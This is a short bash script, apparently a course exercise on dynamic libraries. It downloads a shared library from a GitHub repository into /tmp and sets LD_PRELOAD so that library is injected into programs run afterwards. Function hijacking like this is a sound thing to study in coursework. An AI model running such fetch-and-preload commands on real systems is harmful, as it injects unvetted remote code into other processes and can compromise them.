#!/bin/bash
wget -P /tmp https://github.com/hcissey0/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libwin.so
export LD_PRELOAD=/tmp/libwin.so
